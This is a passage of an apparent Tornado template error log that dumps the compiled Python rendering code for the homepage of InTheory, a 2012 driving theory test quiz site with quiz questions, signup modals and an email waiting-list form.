209      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
210      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
211      _append(_tmp)  # home.html:21 (via base.html:76)
212      _append('", "')  # home.html:21 (via base.html:76)
213      _tmp = kwargs["questions"][4].options[3]  # home.html:21 (via base.html:76)
214      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
215      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
216      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
217      _append(_tmp)  # home.html:21 (via base.html:76)
218      _append('"],"answer": ')  # home.html:21 (via base.html:76)
219      _tmp = kwargs["questions"][4].answer  # home.html:21 (via base.html:76)
220      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
221      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
222      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
223      _append(_tmp)  # home.html:21 (via base.html:76)
224      _append('},{ "question":"')  # home.html:21 (via base.html:76)
225      _tmp = kwargs["questions"][5].question  # home.html:21 (via base.html:76)
226      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
227      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
228      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
229      _append(_tmp)  # home.html:21 (via base.html:76)
230      _append('","options": ["')  # home.html:21 (via base.html:76)
231      _tmp = kwargs["questions"][5].options[0]  # home.html:21 (via base.html:76)
232      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
233      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
234      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
235      _append(_tmp)  # home.html:21 (via base.html:76)
236      _append('", "')  # home.html:21 (via base.html:76)
237      _tmp = kwargs["questions"][5].options[1]  # home.html:21 (via base.html:76)
238      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
239      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
240      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
241      _append(_tmp)  # home.html:21 (via base.html:76)
242      _append('", "')  # home.html:21 (via base.html:76)
243      _tmp = kwargs["questions"][5].options[2]  # home.html:21 (via base.html:76)
244      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
245      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
246      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
247      _append(_tmp)  # home.html:21 (via base.html:76)
248      _append('", "')  # home.html:21 (via base.html:76)
249      _tmp = kwargs["questions"][5].options[3]  # home.html:21 (via base.html:76)
250      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
251      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
252      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
253      _append(_tmp)  # home.html:21 (via base.html:76)
254      _append('"],"answer": ')  # home.html:21 (via base.html:76)
255      _tmp = kwargs["questions"][5].answer  # home.html:21 (via base.html:76)
256      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
257      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
258      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
259      _append(_tmp)  # home.html:21 (via base.html:76)
260      _append('}, { "question":"')  # home.html:21 (via base.html:76)
261      _tmp = kwargs["questions"][6].question  # home.html:21 (via base.html:76)
262      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
263      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
264      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
265      _append(_tmp)  # home.html:21 (via base.html:76)
266      _append('","options": ["')  # home.html:21 (via base.html:76)
267      _tmp = kwargs["questions"][6].options[0]  # home.html:21 (via base.html:76)
268      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
269      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
270      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
271      _append(_tmp)  # home.html:21 (via base.html:76)
272      _append('", "')  # home.html:21 (via base.html:76)
273      _tmp = kwargs["questions"][6].options[1]  # home.html:21 (via base.html:76)
274      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
275      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
276      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
277      _append(_tmp)  # home.html:21 (via base.html:76)
278      _append('", "')  # home.html:21 (via base.html:76)
279      _tmp = kwargs["questions"][6].options[2]  # home.html:21 (via base.html:76)
280      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
281      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
282      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
283      _append(_tmp)  # home.html:21 (via base.html:76)
284      _append('", "')  # home.html:21 (via base.html:76)
285      _tmp = kwargs["questions"][6].options[3]  # home.html:21 (via base.html:76)
286      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
287      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
288      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
289      _append(_tmp)  # home.html:21 (via base.html:76)
290      _append('"],"answer": ')  # home.html:21 (via base.html:76)
291      _tmp = kwargs["questions"][6].answer  # home.html:21 (via base.html:76)
292      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
293      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
294      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
295      _append(_tmp)  # home.html:21 (via base.html:76)
296      _append('},{ "question":"')  # home.html:21 (via base.html:76)
297      _tmp = kwargs["questions"][7].question  # home.html:21 (via base.html:76)
298      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
299      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
300      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
301      _append(_tmp)  # home.html:21 (via base.html:76)
302      _append('","options": ["')  # home.html:21 (via base.html:76)
303      _tmp = kwargs["questions"][7].options[0]  # home.html:21 (via base.html:76)
304      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
305      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
306      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
307      _append(_tmp)  # home.html:21 (via base.html:76)
308      _append('", "')  # home.html:21 (via base.html:76)
309      _tmp = kwargs["questions"][7].options[1]  # home.html:21 (via base.html:76)
310      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
311      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
312      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
313      _append(_tmp)  # home.html:21 (via base.html:76)
314      _append('", "')  # home.html:21 (via base.html:76)
315      _tmp = kwargs["questions"][7].options[2]  # home.html:21 (via base.html:76)
316      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
317      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
318      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
319      _append(_tmp)  # home.html:21 (via base.html:76)
320      _append('", "')  # home.html:21 (via base.html:76)
321      _tmp = kwargs["questions"][7].options[3]  # home.html:21 (via base.html:76)
322      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
323      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
324      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
325      _append(_tmp)  # home.html:21 (via base.html:76)
326      _append('"],"answer": ')  # home.html:21 (via base.html:76)
327      _tmp = kwargs["questions"][7].answer  # home.html:21 (via base.html:76)
328      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
329      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
330      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
331      _append(_tmp)  # home.html:21 (via base.html:76)
332      _append('}, { "question":"')  # home.html:21 (via base.html:76)
333      _tmp = kwargs["questions"][8].question  # home.html:21 (via base.html:76)
334      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
335      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
336      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
337      _append(_tmp)  # home.html:21 (via base.html:76)
338      _append('","options": ["')  # home.html:21 (via base.html:76)
339      _tmp = kwargs["questions"][8].options[0]  # home.html:21 (via base.html:76)
340      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
341      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
342      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
343      _append(_tmp)  # home.html:21 (via base.html:76)
344      _append('", "')  # home.html:21 (via base.html:76)
345      _tmp = kwargs["questions"][8].options[1]  # home.html:21 (via base.html:76)
346      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
347      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
348      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
349      _append(_tmp)  # home.html:21 (via base.html:76)
350      _append('", "')  # home.html:21 (via base.html:76)
351      _tmp = kwargs["questions"][8].options[2]  # home.html:21 (via base.html:76)
352      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
353      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
354      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
355      _append(_tmp)  # home.html:21 (via base.html:76)
356      _append('", "')  # home.html:21 (via base.html:76)
357      _tmp = kwargs["questions"][8].options[3]  # home.html:21 (via base.html:76)
358      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
359      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
360      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
361      _append(_tmp)  # home.html:21 (via base.html:76)
362      _append('"],"answer": ')  # home.html:21 (via base.html:76)
363      _tmp = kwargs["questions"][8].answer  # home.html:21 (via base.html:76)
364      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
365      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
366      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
367      _append(_tmp)  # home.html:21 (via base.html:76)
368      _append('},{ "question":"')  # home.html:21 (via base.html:76)
369      _tmp = kwargs["questions"][9].question  # home.html:21 (via base.html:76)
370      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
371      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
372      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
373      _append(_tmp)  # home.html:21 (via base.html:76)
374      _append('","options": ["')  # home.html:21 (via base.html:76)
375      _tmp = kwargs["questions"][9].options[0]  # home.html:21 (via base.html:76)
376      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
377      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
378      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
379      _append(_tmp)  # home.html:21 (via base.html:76)
380      _append('", "')  # home.html:21 (via base.html:76)
381      _tmp = kwargs["questions"][9].options[1]  # home.html:21 (via base.html:76)
382      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
383      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
384      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
385      _append(_tmp)  # home.html:21 (via base.html:76)
386      _append('", "')  # home.html:21 (via base.html:76)
387      _tmp = kwargs["questions"][9].options[2]  # home.html:21 (via base.html:76)
388      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
389      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
390      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
391      _append(_tmp)  # home.html:21 (via base.html:76)
392      _append('", "')  # home.html:21 (via base.html:76)
393      _tmp = kwargs["questions"][9].options[3]  # home.html:21 (via base.html:76)
394      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
395      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
396      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
397      _append(_tmp)  # home.html:21 (via base.html:76)
398      _append('"],"answer": ')  # home.html:21 (via base.html:76)
399      _tmp = kwargs["questions"][9].answer  # home.html:21 (via base.html:76)
400      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
401      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
402      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
403      _append(_tmp)  # home.html:21 (via base.html:76)
404      _append('}]\'>\n</div>\n<div id="answers" data-answers=\'[]\'></div>\n<div id="mini-quiz-box" class="undimmed">\n')  # home.html:25 (via base.html:76)
405      question = kwargs['questions'][0]  # home.html:25 (via base.html:76)
406      _append('\n<h4> ')  # home.html:26 (via base.html:76)
407      _tmp = question.question  # home.html:26 (via base.html:76)
408      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:26 (via base.html:76)
409      else: _tmp = _utf8(str(_tmp))  # home.html:26 (via base.html:76)
410      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:26 (via base.html:76)
411      _append(_tmp)  # home.html:26 (via base.html:76)
412      _append('</h4>\n<ul remaining-answers=')  # home.html:27 (via base.html:76)
413      _tmp = len(question.answer)  # home.html:27 (via base.html:76)
414      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:27 (via base.html:76)
415      else: _tmp = _utf8(str(_tmp))  # home.html:27 (via base.html:76)
416      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:27 (via base.html:76)
417      _append(_tmp)  # home.html:27 (via base.html:76)
418      _append(' class="nav nav-pills nav-stacked">\n<li><a class="choice" ind="0"><span class="badge badge-info">A</span> ')  # home.html:28 (via base.html:76)
419      _tmp = question.options[0]  # home.html:28 (via base.html:76)
420      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:28 (via base.html:76)
421      else: _tmp = _utf8(str(_tmp))  # home.html:28 (via base.html:76)
422      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:28 (via base.html:76)
423      _append(_tmp)  # home.html:28 (via base.html:76)
424      _append('</a></li>\n<li><a class="choice" ind="1"><span class="badge badge-info">B</span> ')  # home.html:29 (via base.html:76)
425      _tmp = question.options[1]  # home.html:29 (via base.html:76)
426      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:29 (via base.html:76)
427      else: _tmp = _utf8(str(_tmp))  # home.html:29 (via base.html:76)
428      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:29 (via base.html:76)
429      _append(_tmp)  # home.html:29 (via base.html:76)
430      _append('</a></li>\n<li><a class="choice" ind="2"><span class="badge badge-info">C</span> ')  # home.html:30 (via base.html:76)
431      _tmp = question.options[2]  # home.html:30 (via base.html:76)
432      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:30 (via base.html:76)
433      else: _tmp = _utf8(str(_tmp))  # home.html:30 (via base.html:76)
434      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:30 (via base.html:76)
435      _append(_tmp)  # home.html:30 (via base.html:76)
436      _append('</a></li>\n<li><a class="choice" ind="3"><span class="badge badge-info">D</span> ')  # home.html:31 (via base.html:76)
437      _tmp = question.options[3]  # home.html:31 (via base.html:76)
438      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:31 (via base.html:76)
439      else: _tmp = _utf8(str(_tmp))  # home.html:31 (via base.html:76)
440      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:31 (via base.html:76)
441      _append(_tmp)  # home.html:31 (via base.html:76)
442      _append('</a></li>\n</ul>\n<a id="next" class="btn btn-success btn-mini disabled">Next Question</a>\n</div>\n</div>\n</div>\n</div>\n</div>\n<div class="row">\n<div class="span10">\n</div>\n<div class="span5 offset5">\n</br></br>\n<blockquote>\n<p>\n<h2><div class="funkytext"><font color="#ffffff">"')  # home.html:47 (via base.html:76)
443      _tmp = kwargs['tweet']  # home.html:47 (via base.html:76)
444      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:47 (via base.html:76)
445      else: _tmp = _utf8(str(_tmp))  # home.html:47 (via base.html:76)
446      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:47 (via base.html:76)
447      _append(_tmp)  # home.html:47 (via base.html:76)
448      _append('"</h2>\n<div class="funkytext">- Dave Mason, London</font></div>\n</p>\n</blockquote>\n</div>\n</div>\n</div> <!-- /container -->\n<div id="dim">\n</div>\n')  # home.html:57 (via base.html:76)
449      _append('\n')  # base.html:80
450      _tmp = xsrf_form_html()  # base.html:80
451      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:80
452      else: _tmp = _utf8(str(_tmp))  # base.html:80
453      _append(_tmp)  # base.html:80
454      _append('\n')  # base.html:81
455      _append('\n<script src="')  # base.html:82 (via base.html:81)
456      _tmp = static_url('js/libs/jquery-1.7.2.min.js')  # base.html:82 (via base.html:81)
457      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:82 (via base.html:81)
458      else: _tmp = _utf8(str(_tmp))  # base.html:82 (via base.html:81)
459      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:82 (via base.html:81)
460      _append(_tmp)  # base.html:82 (via base.html:81)
461      _append('"></script>\n<script src="')  # base.html:83 (via base.html:81)
462      _tmp = static_url('js/libs/blurb.min.js')  # base.html:83 (via base.html:81)
463      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:83 (via base.html:81)
464      else: _tmp = _utf8(str(_tmp))  # base.html:83 (via base.html:81)
465      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:83 (via base.html:81)
466      _append(_tmp)  # base.html:83 (via base.html:81)
467      _append('"></script>\n<script src="')  # base.html:84 (via base.html:81)
468      _tmp = static_url('js/IT.js')  # base.html:84 (via base.html:81)
469      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:84 (via base.html:81)
470      else: _tmp = _utf8(str(_tmp))  # base.html:84 (via base.html:81)
471      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:84 (via base.html:81)
472      _append(_tmp)  # base.html:84 (via base.html:81)
473      _append('"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-dropdown.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-button.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-modal.js"></script>\n')  # base.html:88 (via base.html:81)
474      _append('\n')  # base.html:90
475      for js in kwargs['js_deps']:  # base.html:90
476          _append('\n<script src="')  # base.html:91
477          _tmp = static_url(js)  # base.html:91
478          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:91
479          else: _tmp = _utf8(str(_tmp))  # base.html:91
480          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:91
481          _append(_tmp)  # base.html:91
482          _append('"></script>\n')  # base.html:92
483      _append('\n')  # base.html:94
484      _append('\n<script id="signup-template" type="text/x-jquery-tmpl">\n<div id="windowTitleDialog" class="modal hide fade">\n<div class="modal-header">\n<a class="close">&times;</a>\n<h3>You scored ${score} out of 10!</h3>\n</div>\n<div class="modal-body">\n<p>You still need a little practice, but don\'t worry we\'re here to help you pass. Sign-up today to get started...</p>\n<a href="/login"><center><img src="')  # home.html:68 (via base.html:94)
485      _tmp = static_url('imgs/facebook.png')  # home.html:68 (via base.html:94)
486      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:68 (via base.html:94)
487      else: _tmp = _utf8(str(_tmp))  # home.html:68 (via base.html:94)
488      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:68 (via base.html:94)
489      _append(_tmp)  # home.html:68 (via base.html:94)
490      _append('" alt="some_text"/></a>\n<img src="')  # home.html:69 (via base.html:94)
491      _tmp = static_url('imgs/twitter.png')  # home.html:69 (via base.html:94)
492      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:69 (via base.html:94)
493      else: _tmp = _utf8(str(_tmp))  # home.html:69 (via base.html:94)
494      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:69 (via base.html:94)
495      _append(_tmp)  # home.html:69 (via base.html:94)
496      _append('" alt="some_text"/>\n<img src="')  # home.html:70 (via base.html:94)
497      _tmp = static_url('imgs/google.png')  # home.html:70 (via base.html:94)
498      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:70 (via base.html:94)
499      else: _tmp = _utf8(str(_tmp))  # home.html:70 (via base.html:94)
500      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:70 (via base.html:94)
501      _append(_tmp)  # home.html:70 (via base.html:94)
502      _append('" alt="some_text"/></center>\n<center><a href="h">Or click here to sign-up directly</a></center>\n</div>\n<div class="modal-footer">\n<ul class="pager">\n<li class="previous"><a href="#">Sign in to InTheory</a></li>\n<li class="next"><a href="#">Forgot username or password?</a></li>\n</ul>\n</div>\n</div>\n</script>\n<script id="show-arrow-template" type="text/x-jquery-tmpl">\n<div class="arrow-container">\n<img src="')  # home.html:84 (via base.html:94)
503      _tmp = static_url('imgs/arrow.png')  # home.html:84 (via base.html:94)
504      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:84 (via base.html:94)
505      else: _tmp = _utf8(str(_tmp))  # home.html:84 (via base.html:94)
506      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:84 (via base.html:94)
507      _append(_tmp)  # home.html:84 (via base.html:94)
508      _append('"/>\n</div>\n</script>\n<script id="email-template" type="text/x-jquery-tmpl">\n<div id="windowTitleDialog" class="modal hide fade">\n<div class="modal-header">\n<a class="close">&times;</a>\n<h3>You scored ${score} out of 10!</h3>\n</div>\n<div class="modal-body">\n<center>\n<p>Leave your email and we\'ll let you know when we launch!</p>\n<form method="post" class="af-form-wrapper" action="http://www.aweber.com/scripts/addlead.pl" >\n<div style="display: none;">\n<input type="hidden" name="meta_web_form_id" value="677441365" />\n<input type="hidden" name="meta_split_id" value="" />\n<input type="hidden" name="listname" value="intheory" />\n<input type="hidden" name="redirect" value="http://www.aweber.com/thankyou-coi.htm?m=video" id="redirect_b3be9783c304109a8d9d9ca013e7b651" />\n<input type="hidden" name="meta_adtracking" value="Waiting_List_/_Splash" />\n<input type="hidden" name="meta_message" value="1" />\n<input type="hidden" name="meta_required" value="name,email" />\n<input type="hidden" name="meta_tooltip" value="" />\n</div>\n<div id="af-form-677441365" class="af-form"><div id="af-body-677441365" class="af-body af-standards">\n<div class="af-element">\n<div class="af-textWrap"></br>\n<input id="awf_field-39151245" type="text" name="name" class="text" placeholder="Enter Your Name" tabindex="500" />\n</div>\n<div class="af-clear"></div></div>\n<div class="af-element">\n<div class="af-textWrap"><input class="text" id="awf_field-39151246" type="text" name="email" placeholder="Enter Your Email" tabindex="501" />\n</div><div class="af-clear"></div>\n</div>\n<input name="submit" class="btn btn-primaryw" type="submit" value="Submit" tabindex="502" />\n</br>\n<a href="/login">or connect with Facebook</a>\n</div>\n</br></br>\n<div class="af-element privacyPolicy" style="text-align: center"><p>We respect your <a title="Privacy Policy" href="http://www.aweber.com/permission.htm" target="_blank">email privacy</a></p>\n<div class="af-clear"></div>\n</div>\n</div>\n</div>\n<div style="display: none;"><img src="http://forms.aweber.com/form/displays.htm?id=bOzsLCyMzGys" alt="" /></div>\n</form>\n</center>\n<script type="text/javascript">\n<!--\n(function() {\nvar IE = /*@cc_on!@*/false;\nif (!IE) { return; }\nif (document.compatMode && document.compatMode == \'BackCompat\') {\nif (document.getElementById("af-form-677441365")) {\ndocument.getElementById("af-form-677441365").className = \'af-form af-quirksMode\';\n}\nif (document.getElementById("af-body-677441365")) {\ndocument.getElementById("af-body-677441365").className = "af-body inline af-quirksMode";\n}\nif (document.getElementById("af-header-677441365")) {\ndocument.getElementById("af-header-677441365").className = "af-header af-quirksMode";\n}\nif (document.getElementById("af-footer-677441365")) {\ndocument.getElementById("af-footer-677441365").className = "af-footer af-quirksMode";\n}\n}\n})();\n-->\n</script>\n</div>\n</div>\n</script>\n')  # home.html:158 (via base.html:94)
509      _append('\n<div class="container">\n<div class="footer"><font color="#FFFFFF" size="2px"> <p class="alignleft">InTheory Media Limited \xc2\xa9 2012</p>\n<p class="alignright">About Us | Terms & Conditions | Privacy Policy | Support </p></font></br>\n</div>\n</div>\n</body>\n</html>\n')  # base.html:106
510      return _utf8('').join(_buffer)  # base.html:0
ERROR:root:home.html code:
  1  def _execute():  # base.html:0
  2      _buffer = []  # base.html:0
  3      _append = _buffer.append  # base.html:0
  4      _append('<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\n<!--[if lt IE 7 ]> <html lang="en" class="no-js ie6"> <![endif]-->\n<!--[if IE 7 ]> <html lang="en" class="no-js ie7"> <![endif]-->\n<!--[if IE 8 ]> <html lang="en" class="no-js ie8"> <![endif]-->\n<!--[if IE 9 ]> <html lang="en" class="no-js ie9"> <![endif]-->\n<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" class="no-js"> <!--<![endif]-->\n<head xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml">\n<meta charset="utf-8">\n<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">\n<meta name="author" content="intheory">\n<meta name="description" content="Intheory 2012">\n<meta property="og:image" content="http://www.petrominpng.com.pg/images/logo_big.png" />\n<meta name="viewport" content="width=920, initial-scale=auto">\n<meta property="og:type" content="website" />\n<meta property="og:title" content="Intheory 2012" />\n<meta property="og:site_name" content="Intheory 2012" />\n<title>\n')  # base.html:19
  5      _append('\nInTheory | Pass Your Theory Test. Guaranteed.\n')  # base.html:21 (via base.html:19)
  6      _append('\n</title>\n<link href="../static/css/bootstrap.css" rel="stylesheet">\n<link href="../static/css/bootstrap-responsive.css" rel="stylesheet">\n<link rel="stylesheet" href="')  # base.html:25
  7      _tmp = static_url('css/base.css')  # base.html:25
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:25
  9      else: _tmp = _utf8(str(_tmp))  # base.html:25
 10      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:25
 11      _append(_tmp)  # base.html:25
 12      _append('" />\n')  # base.html:26
 13      for css in kwargs['css_deps']:  # base.html:26
 14          _append('\n<link href="')  # base.html:27
 15          _tmp = static_url(css)  # base.html:27
 16          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:27
 17          else: _tmp = _utf8(str(_tmp))  # base.html:27
 18          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:27
 19          _append(_tmp)  # base.html:27
 20          _append('" rel="stylesheet">\n')  # base.html:28
 21      _append('\n<style type="text/css">\nhtml{\nbackground-image: url(/static/imgs/background.jpg);\nbackground-repeat: no-repeat;\n}\nbody {\npadding-top: 60px;\npadding-bottom: 40px;\n}\n</style>\n</head>\n<body >\n')  # base.html:44
 22      _append('\n<div class="navbar navbar-fixed-top">\n<div class="navbar-inner">\n<div class="container">\n<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n</a>\n<a class="brand" href="/"> <img src="')  # base.html:53 (via base.html:44)
 23      _tmp = static_url('imgs/logo.png')  # base.html:53 (via base.html:44)
 24      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:53 (via base.html:44)
 25      else: _tmp = _utf8(str(_tmp))  # base.html:53 (via base.html:44)
 26      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:53 (via base.html:44)
 27      _append(_tmp)  # base.html:53 (via base.html:44)
 28      _append('"></a>\n<div class="pull-right">\n')  # base.html:55 (via base.html:44)
 29      if not current_user:  # base.html:55 (via base.html:44)
